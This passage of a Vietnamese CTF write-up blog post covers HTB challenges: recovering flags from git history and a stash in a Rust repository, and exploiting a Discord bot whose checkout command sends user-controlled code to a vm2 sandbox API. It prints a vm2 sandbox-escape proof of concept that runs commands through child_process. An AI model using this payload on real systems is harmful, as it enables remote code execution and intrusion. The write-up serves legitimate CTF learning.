+    print!(&quot;Enter the administrator password: &quot;);
+    io::stdout().flush().unwrap();
+
+    let mut input = String::new();
+    io::stdin()
+        .read_line(&amp;mut input)
+        .expect(&quot;Failed to read password&quot;);
+
+    if input.trim() != admin_password {
+        eprintln!(&quot;Password invalid!&quot;);
+        std::process::exit(-1);
+    }
+
+    input.clear();
+
+    println!(&quot;{}\n&quot;, MENU);
+
+    loop {
+        print!(&quot;&gt; &quot;);
+        io::stdout().flush().unwrap();
+
+        io::stdin()
+            .read_line(&amp;mut input)
+            .expect(&quot;Failed to read line&quot;);
+
+        let number: i32 = input.trim().parse().unwrap_or_else(|_| {
+            eprintln!(&quot;Please enter a valid integer!&quot;);
+            return 5;
+        });
+
+        match number {
+            1 =&gt; add_user(),
+            2 =&gt; view_users(),
+            3 =&gt; delete_user(),
+            4 =&gt; break,
+            _ =&gt; println!(&quot;Invalid choice, please try again!&quot;)
+        }
+    }
+}
+
+fn add_user() {
+    print!(&quot;Username: &quot;);
+    io::stdout().flush().unwrap();
+
+    let mut username = String::new();
+
+    io::stdin()
+        .read_line(&amp;mut username)
+        .expect(&quot;Failed to read line&quot;);
+
+    let username = username.trim();
+
+    print!(&quot;Password: &quot;);
+    io::stdout().flush().unwrap();
+
+    let mut password = String::new();
+
+    io::stdin()
+        .read_line(&amp;mut password)
+        .expect(&quot;Failed to read line&quot;);
+
+    let password = password.trim();
+
+    let conn = DB_CONN.lock().unwrap();
+
+    conn.execute(&quot;INSERT INTO users (username, password) VALUES (?1, ?2);&quot;, &amp;[&amp;username, &amp;password])
+        .expect(&quot;Failed to create user!&quot;);
+}
+
+fn view_users() {
+    let conn = DB_CONN.lock().unwrap();
+    let mut stmt = conn.prepare(&quot;SELECT id, username, password FROM users;&quot;)
+        .expect(&quot;Failed to prepare a statement&quot;);
+    let mut rows = stmt.query([])
+        .expect(&quot;Error getting users&quot;);
+
+    while let Ok(Some(row)) = rows.next() {
+        let id: i32 = row.get::&lt;_, i32&gt;(0).expect(&quot;Parsing ID failed!&quot;);
+        let username: String = row.get::&lt;_, String&gt;(1).expect(&quot;Parsing username failed!&quot;);
+        let password: String = row.get::&lt;_, String&gt;(2).expect(&quot;Parsing password failed!&quot;);
+
+        println!(&quot;ID {}: {}\t{}&quot;, id, username, password);
+    };
+}
+
+fn delete_user() {
+    let conn = DB_CONN.lock().unwrap();
+
+    print!(&quot;Enter ID: &quot;);
+    io::stdout().flush().unwrap();
+
+    let mut input = String::new();
+    io::stdin()
+        .read_line(&amp;mut input)
+        .expect(&quot;Failed to read line&quot;);
+
+    let number: i32 = match input.trim().parse() {
+        Ok(num) =&gt; num,
+        Err(_) =&gt; {
+            eprintln!(&quot;Please enter a valid integer!&quot;);
+            return;
+        }
+    };
+
+    conn.execute(&quot;DELETE FROM users WHERE id=?1;&quot;, &amp;[&amp;number])
+        .expect(&quot;Failed to delete user!&quot;);
+}
+</code></pre><p>Flag2: <code>_gOT_thE_DB_</code></p>
+<h3 id="nhánh-w4rri0r-changes">Nhánh w4rri0r-changes</h3>
+<ul>
+<li>Tiếp tục switch qua branch w4rri0r-changes, đầu tiên ta sẽ xem những commit tương tự như ở nhánh <code>main</code></li>
+</ul>
+<pre><code>l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ git log -p
+commit bfa416eaeaff63de8f5118be829f669ffd0cc6a7 (HEAD -&gt; w4rri0r-changes)
+Author: w4rri0r &lt;w4rri0r@zephyr.com&gt;
+Date:   Fri May 10 21:07:44 2024 +0100
+
+    Changed output formatting
+
+diff --git a/source.rs b/source.rs
+index 7ece558..431b213 100644
+--- a/source.rs
++++ b/source.rs
+@@ -13,7 +13,9 @@ lazy_static! {
+ const MENU: &amp;str = &quot;MI6: Admin Panel\n\n1) Add Users\n2) View Users\n3) Delete Users\n4) Quit&quot;;
+ 
+ fn main() {
+-    let admin_password: String = env::var(&quot;ADMIN_PASS&quot;).expect(&quot;Admin Password not set!&quot;);
++    // let admin_password: String = env::var(&quot;ADMIN_PASS&quot;).expect(&quot;Admin Password not set!&quot;);
++    // hardcode for testing
++    let admin_password: &amp;str = &quot;HTB{g0t_tH3_p4s5&quot;;
+ 
+     print!(&quot;Enter the administrator password: &quot;);
+     io::stdout().flush().unwrap();
+@@ -96,7 +98,7 @@ fn view_users() {
+         let username: String = row.get::&lt;_, String&gt;(1).expect(&quot;Parsing username failed!&quot;);
+         let password: String = row.get::&lt;_, String&gt;(2).expect(&quot;Parsing password failed!&quot;);
+ 
+-        println!(&quot;ID {}: {}\t{}&quot;, id, username, password);
++        println!(&quot;ID: {}\nUsername: {}\nPassword: {}&quot;, id, username, password);
+     };
+ }
+ 
+
+commit 1501091a639e565d40a2b3b20df3227e86d72a0e (main)
+Author: w4rri0r &lt;w4rri0r@zephyr.com&gt;
+Date:   Fri May 10 21:02:33 2024 +0100
+
+    Removed Sensitive Info...
+
+diff --git a/database.db b/database.db
+index 6a3a58e..8dab4e5 100644
+Binary files a/database.db and b/database.db differ
+
+commit ae4f456dcfe1e989ce13ca25231ac5df2fc4380d
+Author: w4rri0r &lt;w4rri0r@zephyr.com&gt;
+Date:   Fri May 10 21:00:57 2024 +0100
+
+    Initial Commit
+
+diff --git a/database.db b/database.db
+new file mode 100644
+index 0000000..6a3a58e
+Binary files /dev/null and b/database.db differ
+diff --git a/source.rs b/source.rs
+new file mode 100644
+index 0000000..7ece558
+--- /dev/null
++++ b/source.rs
+@@ -0,0 +1,125 @@
++#[macro_use] extern crate lazy_static;
++use std::io;
++use std::io::Write;
++use std::env;
++use std::sync::Mutex;
++use rusqlite::{Connection};
++
++
++lazy_static! {
++    static ref DB_CONN: Mutex&lt;Connection&gt; = Mutex::new(Connection::open(&quot;database.db&quot;).unwrap());
++}
++
++const MENU: &amp;str = &quot;MI6: Admin Panel\n\n1) Add Users\n2) View Users\n3) Delete Users\n4) Quit&quot;;
++
++fn main() {
++    let admin_password: String = env::var(&quot;ADMIN_PASS&quot;).expect(&quot;Admin Password not set!&quot;);
++
++    print!(&quot;Enter the administrator password: &quot;);
++    io::stdout().flush().unwrap();
++
++    let mut input = String::new();
++    io::stdin()
++        .read_line(&amp;mut input)
++        .expect(&quot;Failed to read password&quot;);
++
++    if input.trim() != admin_password {
++        eprintln!(&quot;Password invalid!&quot;);
++        std::process::exit(-1);
++    }
++
++    input.clear();
++
++    println!(&quot;{}\n&quot;, MENU);
++
++    loop {
++        print!(&quot;&gt; &quot;);
++        io::stdout().flush().unwrap();
++
++        io::stdin()
++            .read_line(&amp;mut input)
++            .expect(&quot;Failed to read line&quot;);
++
++        let number: i32 = input.trim().parse().unwrap_or_else(|_| {
++            eprintln!(&quot;Please enter a valid integer!&quot;);
++            return 5;
++        });
++
++        match number {
++            1 =&gt; add_user(),
++            2 =&gt; view_users(),
++            3 =&gt; delete_user(),
++            4 =&gt; break,
++            _ =&gt; println!(&quot;Invalid choice, please try again!&quot;)
++        }
++    }
++}
++
++fn add_user() {
++    print!(&quot;Username: &quot;);
++    io::stdout().flush().unwrap();
++
++    let mut username = String::new();
++
++    io::stdin()
++        .read_line(&amp;mut username)
++        .expect(&quot;Failed to read line&quot;);
++
++    let username = username.trim();
++
++    print!(&quot;Password: &quot;);
++    io::stdout().flush().unwrap();
++
++    let mut password = String::new();
++
++    io::stdin()
++        .read_line(&amp;mut password)
++        .expect(&quot;Failed to read line&quot;);
++
++    let password = password.trim();
++
++    let conn = DB_CONN.lock().unwrap();
++
++    conn.execute(&quot;INSERT INTO users (username, password) VALUES (?1, ?2);&quot;, &amp;[&amp;username, &amp;password])
++        .expect(&quot;Failed to create user!&quot;);
++}
++
++fn view_users() {
++    let conn = DB_CONN.lock().unwrap();
++    let mut stmt = conn.prepare(&quot;SELECT id, username, password FROM users;&quot;)
++        .expect(&quot;Failed to prepare a statement&quot;);
++    let mut rows = stmt.query([])
++        .expect(&quot;Error getting users&quot;);
++
++    while let Ok(Some(row)) = rows.next() {
++        let id: i32 = row.get::&lt;_, i32&gt;(0).expect(&quot;Parsing ID failed!&quot;);
++        let username: String = row.get::&lt;_, String&gt;(1).expect(&quot;Parsing username failed!&quot;);
++        let password: String = row.get::&lt;_, String&gt;(2).expect(&quot;Parsing password failed!&quot;);
++
++        println!(&quot;ID {}: {}\t{}&quot;, id, username, password);
++    };
++}
++
++fn delete_user() {
++    let conn = DB_CONN.lock().unwrap();
++
++    print!(&quot;Enter ID: &quot;);
++    io::stdout().flush().unwrap();
++
++    let mut input = String::new();
++    io::stdin()
++        .read_line(&amp;mut input)
++        .expect(&quot;Failed to read line&quot;);
++
++    let number: i32 = match input.trim().parse() {
++        Ok(num) =&gt; num,
++        Err(_) =&gt; {
++            eprintln!(&quot;Please enter a valid integer!&quot;);
++            return;
++        }
++    };
++
++    conn.execute(&quot;DELETE FROM users WHERE id=?1;&quot;, &amp;[&amp;number])
++        .expect(&quot;Failed to delete user!&quot;);
++}
++
+
+</code></pre><ul>
+<li>Có thể thấy ở nhánh này có 3 commits</li>
+</ul>
+<ul>
+<li>
+<p>commit bfa416eaeaff63de8f5118be829f669ffd0cc6a7 (HEAD -&gt; w4rri0r-changes) -&gt; commit message <code>Changed output formatting</code> và mình thấy author đã xóa admin_password : <code>HTB{g0t_tH3_p4s5</code> và đây là phần 1 của flag.</p>
+</li>
+<li>
+<p>Còn các commit còn lại chỉ là pull từ nhánh main sang commit initialCommit và không có nội dung gì quan trọng.</p>
+</li>
+</ul>
+<p>Flag1: <code>HTB{g0t_tH3_p4s5</code></p>
+<h3 id="flag3---stash">Flag3 - Stash</h3>
+<ul>
+<li>Sau một hồi switching giữa các nhánh thì mình vô tình đọc được 1 nội dung quan trọng mà đáng lẽ ra mình nên nhớ vì từng làm dự án nhiều mem thì bắt buộc phải biết điều này :/</li>
+</ul>
+<pre><code>l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git$ cd refs/
+l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git/refs$ ls
+heads  stash  tags
+l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git/refs$ cat stash 
+a38932590c3265c1c2e0160a70e449ecfb39d3e2
+l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr/.git/refs$ S
+
+</code></pre><ul>
+<li>
+<p>Mình thấy có một stash ở đây, thì hiểu nôm na là nếu dự án có nhiều người code thì để 1 người sẽ có 1 branch riêng mà sau khi pull từ main về sẽ gỡ conflict khi code vì có thể sẽ có 2 hay nhiều người cùng sửa chúng 1 đoạn code và code của họ có thể sẽ khác nhau -&gt; sau khi sửa xong sẽ merge từ nhánh sang main và main sẽ là source hoàn thiện nhất.</p>
+</li>
+<li>
+<p>Có nhiều cách có thể stash được đoạn code được giấu trên đây thì có thể dùng vs code hoặc dùng  git command cũng được</p>
+</li>
+</ul>
+<pre><code>l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ git stash pop
+Auto-merging source.rs
+On branch w4rri0r-changes
+Changes to be committed:
+  (use &quot;git restore --staged &lt;file&gt;...&quot; to unstage)
+	modified:   database.db
+
+Changes not staged for commit:
+  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)
+  (use &quot;git restore &lt;file&gt;...&quot; to discard changes in working directory)
+	modified:   source.rs
+
+Dropped refs/stash@{0} (a38932590c3265c1c2e0160a70e449ecfb39d3e2)
+l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ ls
+database.db  source.rs
+l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ cat source.rs | grep &quot;}&quot;
+use rusqlite::{Connection};
+}
+    }
+    println!(&quot;Code: g0T_TH3_sT4sH}&quot;);
+    println!(&quot;{}\n&quot;, MENU);
+        });
+        }
+    }
+}
+}
+        println!(&quot;ID: {}\nUsername: {}\nPassword: {}&quot;, id, username, password);
+    };
+}
+        }
+    };
+}
+l3mnt2010@l3mnt2010-virtual-machine:~/Documents/misc_zephyr$ 
+
+
+</code></pre><p>Flag3 : <code>g0T_TH3_sT4sH}</code></p>
+<p>Hoặc dùng vs code :
+<img src="https://hackmd.io/_uploads/HJ4YmM6m0.png" alt="image"></p>
+<p>Flag: <code>HTB{g0t_tH3_p4s5_gOT_thE_DB_g0T_TH3_sT4sH}</code></p>
+<h2 id="webmagicom">Web/Magicom</h2>
+<ul>
+<li>Tiếp tục là một bài white-box source php một bài web mà mấy anh trong clb <code>thao thức không ngủ</code> vì nó:&gt;</li>
+</ul>
+<h2 id="miscsuper-duper-pwn">misc/Super-Duper Pwn</h2>
+<ul>
+<li>
+<p>Một bài misc mà đúng ra là nó là web white-box, nhờ có bài này mà mình hiểu khá rõ cách để tạo 1 con bot trong discord:&gt;</p>
+</li>
+<li>
+<p>Oke, view qua source ta thấy chall có 2 phần chính code với nodejs:</p>
+</li>
+</ul>
+<ol>
+<li>con bot được build từ <code>dircord.js</code> của <code>npm</code></li>
+<li>node server api được con bot này kết nối.</li>
+</ol>
+<ul>
+<li>Ta có thể dựng local bằng cách thay token và client-id được cung cấp cho developer của discord.</li>
+</ul>
+<h3 id="bot">bot</h3>
+<pre><code>import { Client, GatewayIntentBits, REST, Routes, EmbedBuilder } from &quot;discord.js&quot;;
+import axios from &quot;axios&quot;;
+
+const token = process.env.BOT_TOKEN;
+const clientId = process.env.CLIENT_ID;
+
+const evaluateCode = async (code) =&gt; {
+    try {
+        const response = await axios.post(&quot;http://api:3000/run&quot;, { code });
+        return JSON.stringify(response.data.output);
+    } catch (error) {
+        return error.message;
+    }
+}
+
+const getRandomPrice = () =&gt; Math.floor(Math.random() * (12 - 5 + 1)) + 5;
+
+let products = [
+    { id: &quot;PROD001&quot;, name: &quot;Blamco Brand Mac and Cheese&quot;, description: &quot;A cheesy delight for those in the wasteland.&quot;, price: getRandomPrice(), image: &quot;https://images.fallout.wiki/thumb/f/fb/Fallout4_Blamco_brand_mac_and_cheese.png/540px-Fallout4_Blamco_brand_mac_and_cheese.png&quot; },
+    { id: &quot;PROD002&quot;, name: &quot;InstaMash&quot;, description: &quot;Instant mashed potatoes.&quot;, price: getRandomPrice(), image: &quot;https://images.fallout.wiki/thumb/c/ce/Fallout4_InstaMash.png/540px-Fallout4_InstaMash.png&quot; },
+    { id: &quot;PROD003&quot;, name: &quot;Sugar Bombs&quot;, description: &quot;Pre-war breakfast cereal.&quot;, price: getRandomPrice(), image: &quot;https://images.fallout.wiki/thumb/d/d7/Fallout4_Sugar_Bombs.png/361px-Fallout4_Sugar_Bombs.png&quot; },
+    { id: &quot;PROD004&quot;, name: &quot;Salisbury Steak&quot;, description: &quot;Tasty, preserved Salisbury steak.&quot;, price: getRandomPrice(), image: &quot;https://images.fallout.wiki/thumb/0/0f/Fallout4_Salisbury_Steak.png/540px-Fallout4_Salisbury_Steak.png&quot; },
+    { id: &quot;PROD005&quot;, name: &quot;Potato Crisps&quot;, description: &quot;Crispy and salty potato chips.&quot;, price: getRandomPrice(), image: &quot;https://images.fallout.wiki/thumb/a/ab/Fallout4_Potato_Crisps.png/242px-Fallout4_Potato_Crisps.png&quot; },
+    { id: &quot;PROD006&quot;, name: &quot;Pork n' Beans&quot;, description: &quot;A can of beans with bits of pork.&quot;, price: getRandomPrice(), image: &quot;https://images.fallout.wiki/thumb/2/24/Fallout4_Pork_n%27_Beans.png/376px-Fallout4_Pork_n%27_Beans.png&quot; },
+    { id: &quot;PROD007&quot;, name: &quot;Fancy Lads Snack Cakes&quot;, description: &quot;Pre-war snack cakes.&quot;, price: getRandomPrice(), image: &quot;https://images.fallout.wiki/thumb/5/57/Fallout4_Fancy_lads_snack_cakes.png/368px-Fallout4_Fancy_lads_snack_cakes.png&quot; },
+    { id: &quot;PROD008&quot;, name: &quot;Dandy Boy Apples&quot;, description: &quot;Preserved pre-war apples.&quot;, price: getRandomPrice(), image: &quot;https://images.fallout.wiki/thumb/0/05/Fo4_Dandy_Boy_Apples.png/540px-Fo4_Dandy_Boy_Apples.png&quot; },
+    { id: &quot;PROD009&quot;, name: &quot;Cram&quot;, description: &quot;Canned meat product.&quot;, price: getRandomPrice(), image: &quot;https://images.fallout.wiki/thumb/7/72/Fallout4_Cram.png/540px-Fallout4_Cram.png&quot; },
+    { id: &quot;PROD010&quot;, name: &quot;Canned Dog Food&quot;, description: &quot;Dog food, but you can eat it too.&quot;, price: getRandomPrice(), image: &quot;https://images.fallout.wiki/thumb/b/b7/Canned_dog_food.png/371px-Canned_dog_food.png&quot; },
+    { id: &quot;PROD011&quot;, name: &quot;Yum Yum Deviled Eggs&quot;, description: &quot;Canned deviled eggs.&quot;, price: getRandomPrice(), image: &quot;https://images.fallout.wiki/6/68/FO76_Yum_yum_deviled_eggs.png&quot; },
+    { id: &quot;PROD012&quot;, name: &quot;Purified Water&quot;, description: &quot;Clean, safe water.&quot;, price: 10, image: &quot;https://images.fallout.wiki/thumb/4/4d/Fo4_purified_water.png/308px-Fo4_purified_water.png&quot; },
+    { id: &quot;PROD013&quot;, name: &quot;Whiskey&quot;, description: &quot;Strong alcoholic drink.&quot;, price: 8, image: &quot;https://images.fallout.wiki/thumb/3/3d/Fo4_Whiskey.png/331px-Fo4_Whiskey.png&quot; },
+    { id: &quot;PROD014&quot;, name: &quot;Nuka-Cola&quot;, description: &quot;The classic post-apocalyptic refreshment.&quot;, price: 20, image: &quot;https://images.fallout.wiki/thumb/1/10/Fallout4_Nuka_Cola.png/300px-Fallout4_Nuka_Cola.png&quot; },
+    { id: &quot;PROD015&quot;, name: &quot;Nuka-Cola Quantum&quot;, description: &quot;A special variant of Nuka-Cola that glows.&quot;, price: 100, image: &quot;https://images.fallout.wiki/thumb/e/e6/Fallout4_Nuka_Cola_Quantum.png/300px-Fallout4_Nuka_Cola_Quantum.png&quot; }
+];
+
+const carts = {};
+
+const client = new Client({ intents: [GatewayIntentBits.Guilds] });
+
+client.on(&quot;ready&quot;, () =&gt; {
+    console.log(`Logged in as ${client.user.tag}!`);
+});
+
+const commands = [
+    {
+        name: &quot;listproducts&quot;,
+        description: &quot;Lists all available products in the vending machine&quot;
+    },
+    {
+        name: &quot;addtocart&quot;,
+        description: &quot;Adds a product to your cart&quot;,
+        options: [{
+            name: &quot;id&quot;,
+            type: 3,
+            description: &quot;Product ID&quot;,
+            required: true
+        }, {
+            name: &quot;quantity&quot;,
+            type: 4,
+            description: &quot;Quantity&quot;,
+            required: true
+        }]
+    },
+    {
+        name: &quot;viewcart&quot;,
+        description: &quot;View the items in your cart&quot;
+    },
+    {
+        name: &quot;checkout&quot;,
+        description: &quot;Check out and calculate the total price&quot;,
+        options: [{
+            name: &quot;discount&quot;,
+            type: 3,
+            description: &quot;Discount code&quot;,
+            required: false
+        }]
+    }
+];
+
+const rest = new REST({ version: &quot;10&quot; }).setToken(token);
+
+(async () =&gt; {
+    try {
+        console.log(&quot;Started refreshing application (/) commands globally.&quot;);
+
+        await rest.put(
+            Routes.applicationCommands(clientId),
+            { body: commands },
+        );
+
+        console.log(&quot;Successfully reloaded application (/) commands globally.&quot;);
+    } catch (error) {
+        console.error(error);
+    }
+})();
+
+client.on(&quot;interactionCreate&quot;, async interaction =&gt; {
+    if (!interaction.isChatInputCommand()) return;
+
+    const { commandName } = interaction;
+
+    if (commandName === &quot;listproducts&quot;) {
+        const embeds = products.map(product =&gt; {
+            return new EmbedBuilder()
+                .setColor(0x0099ff)
+                .setTitle(product.name)
+                .setDescription(product.description)
+                .addFields(
+                    { name: &quot;ID&quot;, value: product.id },
+                    { name: &quot;Price&quot;, value: `${product.price} caps` }
+                )
+                .setImage(product.image);
+        });
+
+        const chunks = [];
+        for (let i = 0; i &lt; embeds.length; i += 10) {
+            chunks.push(embeds.slice(i, i + 10));
+        }
+
+        for (const chunk of chunks) {
+            await interaction.channel.send({ embeds: chunk });
+        }
+        await interaction.reply({ content: &quot;Here are the available products:&quot;, ephemeral: true });
+    }
+
+    if (commandName === &quot;addtocart&quot;) {
+        const id = interaction.options.getString(&quot;id&quot;);
+        const quantity = interaction.options.getInteger(&quot;quantity&quot;);
+
+        const product = products.find(p =&gt; p.id === id);
+
+        if (!product) {
+            await interaction.reply(&quot;Product not found.&quot;);
+            return;
+        }
+
+        if (!carts[interaction.user.id]) {
+            carts[interaction.user.id] = [];
+        }
+
+        carts[interaction.user.id].push({ product, quantity });
+
+        await interaction.reply(`${quantity}x ${product.name} added to your cart.`);
+    }
+    if (commandName === &quot;healthCheck&quot;) {
+        await interaction.reply(`Hihi : ${interaction}`);
+    }
+
+    if (commandName === &quot;viewcart&quot;) {
+        const cart = carts[interaction.user.id] || [];
+        if (cart.length === 0) {
+            await interaction.reply(&quot;Your cart is empty.&quot;);
+            return;
+        }
+
+        const embed = new EmbedBuilder()
+            .setColor(0x0099ff)
+            .setTitle(&quot;Your Cart&quot;)
+            .setDescription(&quot;Here are the items in your cart:&quot;);
+
+        cart.forEach(item =&gt; {
+            embed.addFields({ name: item.product.name, value: `Quantity: ${item.quantity}, Price: ${item.product.price} caps each` });
+        });
+
+        await interaction.reply({ embeds: [embed] });
+    }
+
+    if (commandName === &quot;checkout&quot;) {
+        interaction.member.roles.cache.some(role =&gt; console.log(role.name+ &quot;\n&quot;));
+
+        // if (!interaction.member.roles.cache.some(role =&gt; role.name === 'Loggedin')) {
+        //     await interaction.reply(&quot;You don't have permission to use this command.&quot;);
+        //     return;
+        // }
+
+        // const cart = carts[interaction.user.id] || [];
+        // if (cart.length === 0) {
+        //     await interaction.reply(&quot;Your cart is empty.&quot;);
+        //     return;
+        // }
+
+        const discountCode = interaction.options.getString(&quot;discount&quot;);
+
+        const definitions = `
+            const discountCodes = {
+                &quot;DISCOUNT10&quot;: 0.10,
+                &quot;DISCOUNT20&quot;: 0.20,
+                &quot;DISCOUNT30&quot;: 0.30
+            };
+            let cart = ${JSON.stringify(cart)}; 
+            let discountCode = '${discountCode}'; 
+            let discount = 0;
+        `;
+        const code = `
+            if (discountCode &amp;&amp; discountCodes[discountCode]) {
+                discount = discountCodes[discountCode];
+            }
+            
+            let total = 0;
+            cart.forEach(item =&gt; {
+                total += item.product.price * item.quantity;
+            });
+            total *= (1 - discount);
+            total;
+        `;
+        const output = await evaluateCode(definitions + code);
+
+        await interaction.reply(`Your total is ${output} caps`);
+        carts[interaction.user.id] = [];
+    }
+});
+
+client.login(token);
+
+</code></pre><ul>
+<li>
+<p>bot sử dụng 2 <code>dependencies</code> là <code>{ &quot;axios&quot;: &quot;1.6.8&quot;, &quot;discord.js&quot;: &quot;14.14.1&quot; }</code></p>
+</li>
+<li>
+<p>Có 4 chức năng chính với các option khác nhau</p>
+</li>
+</ul>
+<ol>
+<li><code>listproducts</code> hiển thị tất cả sản phầm nằm trong array <code>products </code></li>
+<li><code>addtocart</code> thêm sản phẩm vào giỏ hàng với option là <code>id</code> của mặt hàng.</li>
+<li><code>viewcart</code> hiển thị tất cả các sản phẩm trong giỏ hàng của bạn.</li>
+<li><code>checkout</code> sẽ kiểm tra <code>interaction.member.roles.cache</code> name có hợp lệ hay không -&gt; check cart có hàng hay không -&gt; nhận option <code>discount</code> sau đó tính toán tổng giá trị giỏ hàng và trả ra <code>total</code></li>
+</ol>
+<ul>
+<li>Để ý <code>checkout</code> thông qua hàm <code>evaluateCode</code> thực hiện call api với <code>axios</code> đển backend kèm payload <code>code</code></li>
+</ul>
+<pre><code>const evaluateCode = async (code) =&gt; {
+    try {
+        const response = await axios.post(&quot;http://api:3000/run&quot;, { code });
+        return JSON.stringify(response.data.output);
+    } catch (error) {
+        return error.message;
+    }
+}
+</code></pre><p>-&gt; Đây sẽ là đoạn hook ta khai thác.</p>
+<h3 id="api">api</h3>
+<pre><code>const express = require(&quot;express&quot;);
+const { VM } = require(&quot;vm2&quot;);
+
+const app = express();
+const port = 3000;
+
+app.use(express.json());
+
+app.post(&quot;/run&quot;, (req, res) =&gt; {
+    let { code } = req.body;
+    
+    if (typeof code !== &quot;string&quot;) {
+        return res.status(400).json({ error: &quot;Code must be a string.&quot; });
+    }
+
+    const vm = new VM();
+
+    try {
+        let output = vm.run(code);
+        console.log(output);
+        res.json({ output });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+app.listen(port, () =&gt; {
+    console.log(`Server running on http://127.0.0.1:${port}`);
+});
+
+</code></pre><ul>
+<li>
+<p>Nhận dữ liệu thì server sử dụng vm để tạo môi trường độc lập chạy mã code.</p>
+</li>
+<li>
+<p>Searching thì mình tìm được trên exploit-db poc của <code>vm</code> đúng khít phiên bản này luôn.</p>
+</li>
+</ul>
+<pre><code>const code = `
+async function fn() {
+    (function stack() {
+        new Error().stack;
+        stack();
+    })();
+}
+p = fn();
+p.constructor = {
+    [Symbol.species]: class FakePromise {
+        constructor(executor) {
+            executor(
+                (x) =&gt; x,
+                (err) =&gt; { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned'); }
+            )
+        }
+    }
+};
+p.then();
+`;
+</code></pre><ul>
+<li>Tiến hành lấy shell</li>
+</ul>
+<h1 id="team-write-up-tại-đâyhttpskcsceduvnhtb-business-ctf-2024-the-vault-of-hope-write-upfbclidiwy2xjawf5tbblehrua2flbqixmaabhubadredlyawpdaloxwr9b0b_5qyhe7binaovoepljrzokkmwqvssx3pvw_aem_sbo3gijsuixmivinxyvohw">Team write up: <a href="https://kcsc.edu.vn/htb-business-ctf-2024-the-vault-of-hope-write-up?fbclid=IwY2xjawF5tBBleHRuA2FlbQIxMAABHUBADREdLyawPdAlOxwR9b0B_5qYHe7BInaovOEPljrzOkKMWqVssX3Pvw_aem_sbo3GIjSuixmivINXYVoHw">Tại đây</a></h1>
+
+
+        
+          <div class="blog-tags">
+            
+              
+              <a href="https://bzoltan1.github.io/tags/ctf/">CTF</a>&nbsp;
+            
+              
+              <a href="https://bzoltan1.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://bzoltan1.github.io/write-up/2024-08-20-hackthebox-web-challpart1/" data-toggle="tooltip" data-placement="top" title="Htb web chall ctf 2024 - solved challenges - part 1">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://bzoltan1.github.io/write-up/2024-05-14-htb-machine/" data-toggle="tooltip" data-placement="top" title="Hackthebox some easy machine">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            0001
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://bzoltan1.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://bzoltan1.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
